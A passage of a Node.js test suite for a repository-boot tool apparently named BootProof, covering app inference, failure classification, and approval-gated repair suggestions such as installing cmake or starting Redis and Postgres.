import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import net from "node:net";
import path from "node:path";
import os from "node:os";
import { inferRepo } from "../dist/infer.js";
import { classifyFailure, extractMissingEnvNames, safeLocalEnvValue, TAXONOMY_DOC_CLASSES } from "../dist/taxonomy.js";
import { buildPlan, composeFileFor, envExampleFor, PROTECTED_ENV, repoComposeRepairFile, writePlanFiles } from "../dist/plan.js";
import { buildAttestation, TOOL_ID, verifySignature } from "../dist/proof.js";
import {
  buildExecutionEnv,
  extractHealthCandidates,
  extractLeadingEnvironmentAssignments,
  extractProcessEvidence,
  pollHealth,
  superviseApp,
} from "../dist/exec.js";
import { packageManagerVersionMatches } from "../dist/run.js";
import { diagnoseFailure } from "../dist/diagnosis.js";
import { isRemoteTarget, managedRemoteSource, parseGithubRemote, parseRemoteTarget } from "../dist/remote.js";
import {
  assertRepairScope,
  assertRepairTargetPath,
  composePortRepair,
  deterministicRepairCandidateFor,
  migrationRepairFor,
  packageManagerActivationCommand,
  prismaRepairCommand,
  repairProgressed,
  registeredRemediationsFor,
} from "../dist/repair.js";
import {
  buildRepairAction,
  buildRepairReceiptBase,
  createRepairCommand,
  serializeRepairReceiptBase,
  validateRepairAction,
  validateRepairCommand,
} from "../dist/repair-safety.js";

const FIX = path.resolve("fixtures");

async function getFreePort() {
  return await new Promise((resolve, reject) => {
    const server = net.createServer();
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      const address = server.address();
      assert.ok(address && typeof address !== "string");
      server.close(error => error ? reject(error) : resolve(address.port));
    });
  });
}

async function waitForPortRelease(port, timeoutMs = 5000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const released = await new Promise(resolve => {
      const server = net.createServer();
      server.once("error", () => resolve(false));
      server.listen(port, "127.0.0.1", () => {
        server.close(() => resolve(true));
      });
    });
    if (released) return true;
    await new Promise(resolve => setTimeout(resolve, 50));
  }
  return false;
}

async function withHttpServer(handler, run) {
  const server = await new Promise((resolve, reject) => {
    const candidate = http.createServer(handler);
    candidate.once("error", reject);
    candidate.listen(0, "127.0.0.1", () => resolve(candidate));
  });
  const address = server.address();
  assert.ok(address && typeof address !== "string");
  try {
    return await run(`http://127.0.0.1:${address.port}/`);
  } finally {
    await new Promise((resolve, reject) => server.close(error => error ? reject(error) : resolve()));
  }
}

test("infers a runnable node app with evidence", () => {
  const inf = inferRepo(path.join(FIX, "hello-app"));
  assert.equal(inf.isApplication, true);
  assert.equal(inf.appCommand, "npm run start");
  assert.match(inf.appCommandSource, /scripts\.start/);
  assert.equal(inf.port, 3000);
  assert.match(inf.portEvidence, /assumption/, "default port must be labeled as an assumption, not evidence");
});

test("classifies a library as not_an_application instead of pretending", () => {
  const inf = inferRepo(path.join(FIX, "library-only"));
  assert.equal(inf.isApplication, false);
  assert.match(inf.notAppReason, /library|nothing to boot/);
});

test("failure taxonomy classifies real-world evidence strings", () => {
  assert.equal(classifyFailure("error TS: The engine \"node\" is incompatible with this module").class, "runtime_engine_mismatch");
  assert.equal(classifyFailure("sh: yarn: command not found").class, "missing_package_manager");
  assert.equal(classifyFailure("/bin/sh: go: command not found").class, "missing_runtime_tool");
  assert.equal(classifyFailure("npm ERR! code E401 Unauthorized").class, "private_registry_or_auth");
  assert.equal(classifyFailure("Error: connect ECONNREFUSED 127.0.0.1:5432").class, "database_unreachable");
  assert.equal(classifyFailure("Error: listen EADDRINUSE: address already in use :::3000").class, "port_in_use");
  assert.equal(classifyFailure("Cannot connect to the Docker daemon at unix:///var/run/docker.sock").class, "docker_unavailable");
  assert.equal(classifyFailure("Error: self-signed certificate SELF_SIGNED_CERT_IN_CHAIN").class, "tls_or_proxy_interception");
  assert.equal(classifyFailure(fs.readFileSync(path.join(FIX, "service-port-allocated", "evidence.txt"), "utf8")).class, "service_port_allocated");
  assert.equal(classifyFailure("only HTTP 503 observed at http://localhost:3000/").class, "health_http_error");
  assert.equal(classifyFailure("gibberish nobody has seen").class, "unknown_failure");
});

test("Mastodon and GitLab failures have precise classes, metadata, and safe next steps", () => {
  const cases = [
    {
      evidence: "rbenv: version '3.3.11' is not installed",
      failureClass: "missing_ruby_version",
      metadata: { requiredVersion: "3.3.11" },
      safeNextStep: "rbenv install 3.3.11",
    },
    {
      evidence: "ERROR: CMake is required to build Rugged",
      failureClass: "missing_build_tool",
      metadata: { tool: "cmake", affectedGem: "rugged" },
      safeNextStep: "brew install cmake",
    },
    {
      evidence: "Gem::Ext::BuildError: ERROR: Failed to build gem native extension.",
      failureClass: "native_extension_compile_failed",
      metadata: undefined,
      safeNextStep: "Inspect the preserved compiler output, install the required native build dependencies, then rerun bundle install.",
    },
    {
      evidence: "An error occurred while installing idn-ruby (0.1.0), and Bundler cannot continue.",
      failureClass: "native_extension_compile_failed",
      metadata: { affectedGem: "idn-ruby" },
      safeNextStep: "Install the native build dependencies required by idn-ruby, then rerun bundle install.",
    },
    {
      evidence: "Could not load database configuration",
      failureClass: "missing_database_config",
      metadata: { filePath: "config/database.yml" },
      safeNextStep: "Create config/database.yml from the repository's documented example, review it, then rerun BootProof.",
    },
    {
      evidence: 'No such file - ["config/database.yml"]',
      failureClass: "missing_database_config",
      metadata: { filePath: "config/database.yml" },
      safeNextStep: "Create config/database.yml from the repository's documented example, review it, then rerun BootProof.",
    },
    {
      evidence: "No such file or directory @ rb_sysopen - config/gitlab.yml",
      failureClass: "missing_required_config",
      metadata: { filePath: "config/gitlab.yml" },
      safeNextStep: "Create config/gitlab.yml from the repository's documented example, review it, then rerun BootProof.",
    },
    {
      evidence: 'connection to server at "127.0.0.1", port 5432 failed: Connection refused',
      failureClass: "postgres_unavailable",
      metadata: { host: "127.0.0.1", port: "5432" },
      safeNextStep: "Start PostgreSQL, verify the configured host and port are reachable, then rerun BootProof.",
    },
    {
      evidence: "PG::ConnectionBad",
      failureClass: "postgres_unavailable",
      metadata: undefined,
      safeNextStep: "Start PostgreSQL, verify the configured host and port are reachable, then rerun BootProof.",
    },
    {
      evidence: 'FATAL: role "postgres" does not exist',
      failureClass: "postgres_role_missing",
      metadata: { role: "postgres" },
      safeNextStep: "Create the PostgreSQL role postgres or configure the application to use an existing role, then rerun BootProof.",
    },
    {
      evidence: "PG::UndefinedTable",
      failureClass: "database_schema_missing",
      metadata: undefined,
      safeNextStep: "Run the repository's documented database migration or setup command, then rerun BootProof.",
    },
    {
      evidence: 'PG::UndefinedTable: ERROR: relation "application_settings" does not exist',
      failureClass: "database_schema_missing",
      metadata: { table: "application_settings" },
      safeNextStep: "Run the repository's documented database migration or setup command, then rerun BootProof.",
    },
    {
      evidence: "PostgreSQL 16.14 is installed, but GitLab requires PostgreSQL >= 17",
      failureClass: "unsupported_database_version",
      metadata: { foundVersion: "16.14", requiredVersion: ">= 17" },
      safeNextStep: "Install or select PostgreSQL >= 17, then rerun BootProof.",
    },
    {
      evidence: "unsupported database names in 'config/database.yml': geo, embedding\nSupported database names: main, ci",
      failureClass: "unsupported_database_config",
      metadata: { unsupportedNames: ["geo", "embedding"], supportedNames: ["main", "ci"] },
      safeNextStep: "Use only the supported database names (main, ci) in config/database.yml, then rerun BootProof.",
    },
    {
      evidence: "Redis::CannotConnectError: Error connecting to Redis on redis://localhost:6379",
      failureClass: "redis_unavailable",
      metadata: { host: "localhost", port: "6379" },
      safeNextStep: "Start Redis, verify the configured host and port are reachable, then rerun BootProof.",
    },
    {
      evidence: "Connection refused - connect(2) for 127.0.0.1:6379",
      failureClass: "redis_unavailable",
      metadata: { host: "127.0.0.1", port: "6379" },
      safeNextStep: "Start Redis, verify the configured host and port are reachable, then rerun BootProof.",
    },
    {
      evidence: "Redis connection failed at redis://localhost:6379",
      failureClass: "redis_unavailable",
      metadata: { host: "localhost", port: "6379" },
      safeNextStep: "Start Redis, verify the configured host and port are reachable, then rerun BootProof.",
    },
  ];

  for (const expected of cases) {
    const result = classifyFailure(expected.evidence);
    assert.equal(result.class, expected.failureClass, expected.evidence);
    assert.deepEqual(result.metadata, expected.metadata, expected.evidence);
    assert.equal(result.safeNextStep, expected.safeNextStep, expected.evidence);
    const diagnosis = diagnoseFailure(result.class, expected.evidence, result.explanation);
    assert.equal(diagnosis.safeNextStep, expected.safeNextStep, expected.evidence);
  }
});

test("real-world classifiers do not overclassify unrelated evidence", () => {
  const unrelated = [
    "rbenv version 3.3.11 is installed",
    "CMake project generated successfully",
    "Rugged loaded successfully",
    "config/gitlab.yml loaded",
    'PostgreSQL role "postgres" exists',
    "PostgreSQL 17.1 is installed and supported",
    "Redis URL configured: redis://localhost:6379",
  ];
  for (const evidence of unrelated) {
    const failureClass = classifyFailure(evidence).class;
    assert.ok(
      ![
        "missing_ruby_version",
        "missing_build_tool",
        "native_extension_compile_failed",
        "missing_database_config",
        "missing_required_config",
        "postgres_unavailable",
        "postgres_role_missing",
        "database_schema_missing",
        "unsupported_database_version",
        "unsupported_database_config",
        "redis_unavailable",
      ].includes(failureClass),
      `${evidence} was overclassified as ${failureClass}`,
    );
  }
});

test("Superset-like repository is recognized as a setup-heavy Python/Flask application", () => {
  const inf = inferRepo(path.join(FIX, "python-flask-superset-like"));
  assert.equal(inf.isApplication, true);
  for (const stack of ["python-backend", "flask", "react-frontend", "docker-compose", "celery"]) {
    assert.ok(inf.stack.includes(stack), `missing stack marker ${stack}`);
  }
  assert.deepEqual(inf.setupSteps, ["superset db upgrade", "superset init"]);
  assert.equal(inf.backendCommand, "flask run -p 8088 --reload --debugger");
  assert.equal(inf.frontendCommand, "cd superset-frontend; npm run dev-server");
  assert.equal(inf.workerCommand, "celery --app=superset.tasks.celery_app:app worker");
  assert.equal(inf.port, 8088);
  assert.deepEqual(inf.healthCandidates, ["http://localhost:8088/"]);
});

test("Grafana-like repository is recognized as a Go/backend + Node/frontend hybrid", () => {
  const inf = inferRepo(path.join(FIX, "go-node-grafana-like"));
  assert.equal(inf.isApplication, true);
  for (const stack of ["go-backend", "node-frontend", "react"]) {
    assert.ok(inf.stack.includes(stack), `missing stack marker ${stack}`);
  }
  assert.equal(inf.packageManager, "yarn");
  assert.match(inf.packageManagerEvidence, /yarn@4\.15\.0/);
  assert.equal(inf.frontendCommand, "yarn dev");
  assert.equal(inf.backendCommand, "make run");
  assert.equal(inf.incompleteAppCommand, true);
  assert.match(inf.commandScope, /frontend\/dev pipeline only/);
  assert.ok(inf.healthCandidates.includes("http://localhost:3000/api/health"));

  const root = inf.workspaces.find(candidate => candidate.dir === ".");
  const productionPackage = inf.workspaces.find(candidate => candidate.dir === "packages/runtime");
  const testPlugin = inf.workspaces.find(candidate => candidate.dir.includes("test-plugins"));
  assert.ok(root && productionPackage && testPlugin);
  assert.ok(inf.workspaces.every(candidate => !candidate.dir.includes("\\")), "workspace paths must be platform-neutral");
  assert.ok(root.score > productionPackage.score);
  assert.ok(productionPackage.score > testPlugin.score, "test plugin must rank below production candidates");
});

test("Memos-like repository is an application that requires unsupported orchestration", () => {
  const inf = inferRepo(path.join(FIX, "go-react-memos-like"));
  assert.equal(inf.isApplication, true);
  assert.equal(inf.appCommand, null);
  assert.ok(inf.stack.includes("go-backend"));
  assert.ok(inf.stack.includes("react-frontend"));
  assert.ok(inf.backendMarkers.includes("go.mod"));
  assert.ok(inf.frontendMarkers.includes("web/package.json"));
  assert.deepEqual(inf.healthCandidates, [], "no runnable command means no localhost candidate");
});

test("Ruby backend markers are detected without claiming orchestration support", () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-ruby-"));
  fs.mkdirSync(path.join(repo, "config"), { recursive: true });
  fs.writeFileSync(path.join(repo, "Gemfile"), "source \"https://rubygems.org\"\ngem \"rails\"\n");
  fs.writeFileSync(path.join(repo, "config", "database.yml"), "development:\n  adapter: postgresql\n");
  const inf = inferRepo(repo);
  assert.equal(inf.isApplication, true);
  assert.ok(inf.stack.includes("ruby-backend"));
  assert.ok(inf.backendMarkers.includes("Gemfile"));
  assert.ok(inf.backendMarkers.includes("config/database.yml"));
  assert.equal(inf.appCommand, null);
});

test("custom Make-driven applications select only an explicit supported target", () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-make-driven-"));
  fs.writeFileSync(path.join(repo, "Makefile"), "serve:\n\t./scripts/start-custom-stack\n");
  const inf = inferRepo(repo);
  assert.equal(inf.isApplication, true);
  assert.ok(inf.stack.includes("make-driven"));
  assert.ok(inf.backendMarkers.includes("Makefile"));
  assert.equal(inf.appCommand, "make serve");
  assert.match(inf.appCommandSource, /Makefile target: serve/);
  assert.deepEqual(inf.healthCandidates, ["http://localhost:3000/"]);
});

test("Django repository markers select the explicit management entrypoint", () => {
  const inf = inferRepo(path.join(FIX, "repair-django-migrations"));
  assert.equal(inf.isApplication, true);
  assert.ok(inf.stack.includes("python-backend"));
  assert.ok(inf.stack.includes("django"));
  assert.ok(inf.backendMarkers.includes("manage.py"));
  assert.equal(inf.appCommand, "python manage.py runserver 127.0.0.1:3000");
  assert.equal(inf.appCommandSource, "Django entrypoint: manage.py");
});

test("Go, Rails, and Make fixtures expose conservative repository commands", () => {
  const go = inferRepo(path.join(FIX, "go-react-runnable-like"));
  assert.equal(go.appCommand, "go run ./cmd/app --port 8081 --data .bootproof/runtime/go-app");
  assert.equal(go.appCommandSource, "Go main package: cmd/app/main.go");
  assert.deepEqual(go.preparationCommands.map(command => command.command), ["go mod download"]);
  assert.deepEqual(go.healthCandidates, ["http://localhost:8081/"]);

  const rails = inferRepo(path.join(FIX, "ruby-rails-runnable-like"));
  assert.equal(rails.appCommand, "bundle exec rails server -b 127.0.0.1 -p 3000");
  assert.equal(rails.appCommandSource, "Rails entrypoint: bin/rails");
  assert.deepEqual(rails.preparationCommands.map(command => command.command), ["bundle install"]);

  const make = inferRepo(path.join(FIX, "make-runnable-like"));
  assert.equal(make.appCommand, "make serve");
  assert.equal(make.commandScope, "repository-defined Make target");
});

test("source-built Compose applications are runnable but image-only services are not source proof", () => {
  const source = inferRepo(path.join(FIX, "source-compose-runnable-like"));
  assert.deepEqual(source.composeApplicationServices, [{
    name: "web",
    source: "build",
    healthCandidates: ["http://localhost:31999/ready"],
  }]);
  assert.deepEqual(source.composeHealthCandidates, ["http://localhost:31999/ready"]);
  const plan = buildPlan(source, "docker");
  assert.equal(plan.steps.find(step => step.kind === "service")?.command, "docker compose -f docker-compose.yml up -d");
  assert.deepEqual(plan.steps.filter(step => step.kind === "start-app"), []);
  assert.deepEqual(plan.healthCandidates, ["http://localhost:31999/ready"]);

  const imageOnly = fs.mkdtempSync(path.join(os.tmpdir(), "bp-compose-image-"));
  fs.writeFileSync(path.join(imageOnly, "docker-compose.yml"), [
    "services:",
    "  web:",
    "    image: example/web:latest",
    "    ports:",
    "      - \"3000:3000\"",
    "",
  ].join("\n"));
  const imageInference = inferRepo(imageOnly);
  assert.deepEqual(imageInference.composeApplicationServices, [{
    name: "web",
    source: "image",
    healthCandidates: ["http://localhost:3000/"],
  }]);
  assert.deepEqual(imageInference.composeHealthCandidates, [], "an image-only service cannot prove the checked-out source");
  assert.equal(imageInference.isApplication, false);
});

test("multiple source-built Compose HTTP services remain ambiguous", () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-compose-multiple-"));
  fs.writeFileSync(path.join(repo, "docker-compose.yml"), [
    "services:",
    "  web:",
    "    build: ./web",
    "    ports:",
    "      - \"3101:3000\"",
    "  admin:",
    "    build: ./admin",
    "    ports:",
    "      - \"3102:3000\"",
    "",
  ].join("\n"));
  fs.mkdirSync(path.join(repo, "web"));
  fs.mkdirSync(path.join(repo, "admin"));
  const inf = inferRepo(repo);
  assert.equal(inf.isApplication, true);
  assert.equal(inf.composeApplicationServices.filter(service => service.source === "build").length, 2);
  assert.deepEqual(inf.composeHealthCandidates, [], "one responding service must not prove a multi-service application");
});

test("repository compose is deferred to and Storybook ranks below the production web app", () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-formbricks-like-"));
  fs.cpSync(path.join(FIX, "formbricks-like"), repo, { recursive: true });
  const inf = inferRepo(repo);
  assert.equal(inf.repoComposeFile, "docker-compose.yml");
  assert.ok(inf.services.some(service => service.kind === "postgres"));

  const plan = buildPlan(inf, "docker");
  const service = plan.steps.find(step => step.kind === "service");
  assert.equal(service?.command, "docker compose -f docker-compose.yml up -d");
  assert.equal(service?.description, "defer to the repository's own compose file");
  assert.equal(composeFileFor(inf), null);
  assert.ok(!plan.generatedFiles.some(file => file.path === "docker-compose.bootproof.yml"));

  const written = writePlanFiles(inf, repo);
  assert.ok(!written.includes("docker-compose.bootproof.yml"));
  assert.equal(fs.existsSync(path.join(repo, "docker-compose.bootproof.yml")), false);

  const web = inf.workspaces.find(candidate => candidate.dir === "apps/web");
  const storybook = inf.workspaces.find(candidate => candidate.dir === "apps/storybook");
  assert.ok(web && storybook);
  assert.ok(web.score > storybook.score);
  assert.match(storybook.reason, /documentation\/storybook downranked/);
});

test("parallel monorepo root commands are not treated as a single application boot", () => {
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-parallel-workspaces-"));
  fs.writeFileSync(path.join(repo, "package.json"), JSON.stringify({
    name: "parallel-root",
    private: true,
    packageManager: "pnpm@10.24.0",
    workspaces: ["apps/*"],
    scripts: { dev: "turbo run dev --parallel" },
    devDependencies: { turbo: "2.0.0" },
  }));
  for (const app of ["studio", "docs"]) {
    fs.mkdirSync(path.join(repo, "apps", app), { recursive: true });
    fs.writeFileSync(path.join(repo, "apps", app, "package.json"), JSON.stringify({
      name: app,
      private: true,
      scripts: { dev: "next dev" },
      dependencies: { next: "15.0.0" },
    }));
  }
  const inf = inferRepo(repo);
  assert.equal(inf.multiAppCommand, true);
  assert.match(inf.commandScope, /multi-workspace/);
  assert.equal(inf.workspaces[0].dir, ".");
});

test("pnpm engine mismatch is classified specifically", () => {
  const evidence = fs.readFileSync(path.join(FIX, "pnpm-version-mismatch", "evidence.txt"), "utf8");
  const result = classifyFailure(evidence);
  assert.equal(result.class, "package_manager_version_mismatch");
  assert.match(result.explanation, /Enable Corepack/);
});

test("missing environment names are extracted only from explicit failure contexts", () => {
  assert.deepEqual(extractMissingEnvNames("DATABASE_URL is not set"), ["DATABASE_URL"]);
  assert.deepEqual(extractMissingEnvNames("The RAILS_ENV environment variable is not set."), ["RAILS_ENV"]);
  assert.deepEqual(extractMissingEnvNames("API_TOKEN is required"), ["API_TOKEN"]);
  assert.deepEqual(extractMissingEnvNames("Missing required secret: SESSION_SECRET"), ["SESSION_SECRET"]);
  assert.deepEqual(extractMissingEnvNames("Invalid environment variables:\n  SMTP_PASSWORD: Required"), ["SMTP_PASSWORD"]);
  assert.deepEqual(extractMissingEnvNames("Startup refused; please set REDIS_URL."), ["REDIS_URL"]);
  assert.deepEqual(
    extractMissingEnvNames("See https://example.com/API_TOKEN and compare against CONSTANT_VALUE."),
    [],
    "all-caps URL segments and constants are not missing-env evidence",
  );
  assert.deepEqual(
    extractMissingEnvNames("API_TOKEN is required\nAPI_TOKEN is missing\nMissing required secret: API_TOKEN"),
    ["API_TOKEN"],
    "names are deduplicated",
  );
  const many = Array.from({ length: 12 }, (_, index) => `SECRET_${index} is required`).join("\n");
  assert.equal(extractMissingEnvNames(many).length, 10, "extraction is capped at ten names");
  assert.equal(safeLocalEnvValue("RAILS_ENV"), "development");
  assert.equal(safeLocalEnvValue("API_SECRET"), null, "secret-looking variables must never receive invented defaults");
  const railsFailure = classifyFailure("The RAILS_ENV environment variable is not set.");
  assert.equal(railsFailure.class, "missing_env_var");
  assert.doesNotMatch(railsFailure.explanation, /\.env\.bootproof\.example/);
  assert.notEqual(classifyFailure("config/database.yml is missing (RuntimeError)").class, "missing_env_var");
});

test("taxonomy documentation and tool version stay synchronized", () => {
  const taxonomyDoc = fs.readFileSync(path.resolve("docs/FAILURE_TAXONOMY.md"), "utf8");
  for (const failureClass of TAXONOMY_DOC_CLASSES) {
    assert.ok(taxonomyDoc.includes(`\`${failureClass}\``), `missing taxonomy documentation for ${failureClass}`);
  }
  const pkg = JSON.parse(fs.readFileSync(path.resolve("package.json"), "utf8"));
  assert.equal(TOOL_ID, `bootproof@${pkg.version}`);
});

test("repair scope whitelist permits boot plumbing and rejects application edits", () => {
  assert.doesNotThrow(() => assertRepairScope([
    {
      path: "docker-compose.bootproof.override.yml",
      before: null,
      after: "services:\n  web:\n    ports:\n      - \"4000:3000\"\n",
    },
    {
      path: "package.json",
      before: JSON.stringify({ name: "app", scripts: { start: "node server.js" }, packageManager: "pnpm@9.0.0" }),
      after: JSON.stringify({ name: "app", scripts: { start: "node server.js" }, packageManager: "pnpm@10.0.0" }),
    },
    { path: "config/database.yml", before: null, after: "development:\n" },
    { path: "config/gitlab.yml", before: null, after: "production:\n" },
  ]));
  assert.throws(
    () => assertRepairScope([{ path: "src/server.js", before: "old", after: "patched" }]),
    /honesty contract violation: repair attempted to edit application file/,
  );
  assert.throws(
    () => assertRepairScope([{
      path: "package.json",
      before: JSON.stringify({ scripts: { start: "node old.js" } }),
      after: JSON.stringify({ scripts: { start: "node patched.js" } }),
    }]),
    /package\.json repair exceeded engines\/packageManager scope/,
  );
  assert.throws(
    () => assertRepairScope([{ path: "../outside.bootproof.yml", before: null, after: "no" }]),
    /repair path escapes repository/,
  );
  if (process.platform !== "win32") {
    const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-link-"));
    const outside = fs.mkdtempSync(path.join(os.tmpdir(), "bp-repair-outside-"));
    fs.symlinkSync(outside, path.join(repo, "linked"));
    assert.throws(
      () => assertRepairTargetPath(repo, "linked/docker-compose.bootproof.override.yml"),
      /repair target traverses symbolic link/,
    );
  }
});

test("deterministic repair safety accepts exact safe commands and repo patches", () => {
  const command = buildRepairAction({
    actionType: "command",
    mutationScope: "host",
    riskLevel: "medium",
    command: createRepairCommand("brew", ["install", "cmake"]),
    explanation: "Install the exact classified build tool.",
    evidenceRefs: [".bootproof/attestation.json"],
  });
  assert.equal(validateRepairAction(command).valid, true);
  assert.equal(command.requiresApproval, true);
  assert.equal(command.deterministic, true);
  assert.equal(command.source, "deterministic_playbook");

  const patch = buildRepairAction({
    actionType: "patch",
    mutationScope: "repo",
    riskLevel: "medium",
    patch: {
      format: "unified-diff",
      content: "--- /dev/null\n+++ b/config/database.yml\n@@ -0,0 +1 @@\n+development:\n",
      files: ["config/database.yml"],
    },
    explanation: "Copy the reviewed local database configuration example.",
    evidenceRefs: [".bootproof/attestation.json"],
  });
  assert.equal(validateRepairAction(patch).valid, true);
  assert.equal(patch.requiresApproval, true);
});

test("deterministic fix MVP maps only exact known failures to repair candidates", () => {
  const attestation = (failureClass, failureEvidence) => ({
    result: {
      booted: false,
      healthVerified: false,
      failureClass,
      failureEvidence,
      explanation: failureEvidence,
    },
  });

  const cmake = deterministicRepairCandidateFor(attestation(
    "missing_build_tool",
    "ERROR: CMake is required to build Rugged",
  ));
  assert.equal(cmake.id, "install-cmake-with-homebrew");
  assert.equal(cmake.action.command.display, "brew install cmake");
  assert.equal(cmake.action.mutationScope, "host");
  assert.equal(cmake.action.riskLevel, "medium");
  assert.equal(cmake.action.requiresApproval, true);

  const redis = deterministicRepairCandidateFor(attestation(
    "redis_unavailable",
    "Redis::CannotConnectError Connection refused - connect(2) for 127.0.0.1:6379",
  ), { homebrewAvailable: true });
  assert.equal(redis.action.command.display, "brew services start redis");
  assert.equal(redis.action.mutationScope, "service");
  assert.equal(redis.action.requiresApproval, true);

  const redisInstruction = deterministicRepairCandidateFor(attestation(
    "redis_unavailable",
    "Redis::CannotConnectError Connection refused - connect(2) for 127.0.0.1:6379",
  ), { homebrewAvailable: false });
  assert.equal(redisInstruction.action.actionType, "instruction");
  assert.equal(redisInstruction.action.command, null);
  assert.match(redisInstruction.action.instruction, /Start Redis using your local service manager/);

  const rails = deterministicRepairCandidateFor(attestation(
    "missing_env_var",
    "The RAILS_ENV environment variable is not set.",
  ));
  assert.equal(rails.action.actionType, "instruction");
  assert.equal(rails.action.requiresApproval, false);
  assert.equal(
    rails.action.instruction,
    "RAILS_ENV=development bootproof up . --provider local --unsafe-local --install",
  );
  assert.equal(rails.action.patch, null, "missing env guidance must never patch protected env files");

  assert.equal(deterministicRepairCandidateFor(attestation(
    "missing_build_tool",
    "A different build tool is unavailable",
  )), null);
  assert.equal(deterministicRepairCandidateFor(attestation(
    "missing_env_var",
    "Missing required secret: API_SECRET",
  )), null);
  assert.equal(deterministicRepairCandidateFor(attestation(
    "unknown_failure",
    "unclassified failure",
  )), null);
});

test("expanded deterministic repair registry maps exact failures with safe scopes and risks", () => {
  const attestation = (failureClass, failureEvidence) => ({
    result: {
      booted: false,
      healthVerified: false,
      failureClass,
      failureEvidence,
      explanation: failureEvidence,
    },
  });
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "bp-expanded-repairs-"));
  const config = path.join(repo, "config");
  const homebrew = path.join(repo, "homebrew");
  fs.mkdirSync(config, { recursive: true });
  fs.mkdirSync(path.join(homebrew, "opt"), { recursive: true });
  fs.writeFileSync(path.join(config, "database.yml.postgresql"), "development:\n  adapter: postgresql\n");
  fs.writeFileSync(path.join(config, "gitlab.yml.example"), "production:\n  host: localhost\n");

  const candidates = [];
  const ruby = deterministicRepairCandidateFor(attestation(
    "missing_ruby_version",
    "rbenv: version '3.3.11' is not installed",
  ));
  assert.equal(ruby.action.command.display, "rbenv install 3.3.11");
  assert.equal(ruby.action.mutationScope, "host");
  assert.equal(ruby.action.riskLevel, "medium");
  candidates.push(ruby);

  const idnInstall = deterministicRepairCandidateFor(attestation(
    "native_extension_compile_failed",
    "An error occurred while installing idn-ruby (0.1.0), and Bundler cannot continue.",
  ), { homebrewAvailable: true, homebrewPrefix: homebrew });
  assert.equal(idnInstall.action.command.display, "brew install libidn pkg-config");
  assert.equal(idnInstall.action.mutationScope, "host");
  assert.equal(idnInstall.action.riskLevel, "medium");
  assert.equal(idnInstall.followUpActions[0].command.executable, "bundle");
  assert.deepEqual(idnInstall.followUpActions[0].command.args, [
    "config",
    "build.idn-ruby",
    `--with-idn-dir=${path.join(homebrew, "opt/libidn")}`,
  ]);
  candidates.push(idnInstall);

  fs.mkdirSync(path.join(homebrew, "opt/libidn"));
  const idnConfig = deterministicRepairCandidateFor(attestation(
    "native_extension_compile_failed",
    "An error occurred while installing idn-ruby (0.1.0), and Bundler cannot continue.",
  ), { homebrewAvailable: true, homebrewPrefix: homebrew });
  assert.equal(idnConfig.action.command.executable, "bundle");
  assert.equal(idnConfig.action.mutationScope, "host");
  assert.equal(idnConfig.action.riskLevel, "medium");
  candidates.push(idnConfig);

  const privateHomebrew = path.join(os.homedir(), `bootproof-private-homebrew-${process.pid}`);
  const privatePrefixConfig = deterministicRepairCandidateFor(attestation(
    "native_extension_compile_failed",
    "An error occurred while installing idn-ruby (0.1.0), and Bundler cannot continue.",
  ), { homebrewAvailable: true, homebrewPrefix: privateHomebrew });
  assert.equal(privatePrefixConfig.action.command.display, "brew install libidn pkg-config");
  assert.equal(privatePrefixConfig.followUpActions, undefined);
  assert.equal(JSON.stringify(privatePrefixConfig).includes(os.homedir()), false);

  const databaseConfig = deterministicRepairCandidateFor(attestation(
    "missing_database_config",
    "Could not load database configuration",
  ), { repoPath: repo });
  assert.equal(databaseConfig.action.actionType, "patch");
  assert.equal(databaseConfig.action.mutationScope, "repo");
  assert.equal(databaseConfig.action.riskLevel, "medium");
  assert.match(databaseConfig.action.patch.content, /config\/database\.yml/);
  assert.equal(fs.existsSync(path.join(config, "database.yml")), false);
  candidates.push(databaseConfig);

  const gitlabConfig = deterministicRepairCandidateFor(attestation(
    "missing_required_config",
    "No such file or directory @ rb_sysopen - config/gitlab.yml",
  ), { repoPath: repo });
  assert.equal(gitlabConfig.action.actionType, "patch");
  assert.equal(gitlabConfig.action.mutationScope, "repo");
  assert.equal(gitlabConfig.action.riskLevel, "medium");
  assert.equal(fs.existsSync(path.join(config, "gitlab.yml")), false);
  candidates.push(gitlabConfig);

  const postgres = deterministicRepairCandidateFor(attestation(
    "postgres_unavailable",
    'connection to server at "127.0.0.1", port 5432 failed: Connection refused',
  ), {
    homebrewAvailable: true,
    homebrewPrefix: homebrew,
    homebrewPostgresPackage: "postgresql@17",
  });
  assert.equal(postgres.action.command.display, "brew services start postgresql@17");
  assert.equal(postgres.action.mutationScope, "service");
  assert.equal(postgres.action.riskLevel, "medium");
  assert.equal(postgres.followUpActions[0].instruction, "pg_isready");
  candidates.push(postgres);

  const role = deterministicRepairCandidateFor(attestation(
    "postgres_role_missing",
    'FATAL: role "postgres" does not exist',
  ));
  assert.equal(role.action.command.display, "createuser -s postgres");
  assert.equal(role.action.mutationScope, "database");
  assert.equal(role.action.riskLevel, "medium");
  candidates.push(role);

  const schema = deterministicRepairCandidateFor(attestation(
    "database_schema_missing",
    'PG::UndefinedTable: ERROR: relation "application_settings" does not exist',
  ));
  assert.equal(schema.action.command.display, "bundle exec rails db:migrate");
  assert.equal(schema.action.mutationScope, "database");
  assert.equal(schema.action.riskLevel, "high");
  candidates.push(schema);

  const versionInstall = deterministicRepairCandidateFor(attestation(
    "unsupported_database_version",
    "PostgreSQL 16.14 is installed, but GitLab requires PostgreSQL >= 17",
  ), { homebrewAvailable: true, homebrewPrefix: homebrew });
  assert.equal(versionInstall.action.command.display, "brew install postgresql@17");
  assert.equal(versionInstall.action.mutationScope, "host");
  assert.equal(versionInstall.action.riskLevel, "high");
  assert.equal(versionInstall.followUpActions[0].command.display, "brew services start postgresql@17");
  candidates.push(versionInstall);

  fs.mkdirSync(path.join(homebrew, "opt/postgresql@17"));
  const versionStart = deterministicRepairCandidateFor(attestation(
    "unsupported_database_version",
    "PostgreSQL 16.14 is installed, but GitLab requires PostgreSQL >= 17",
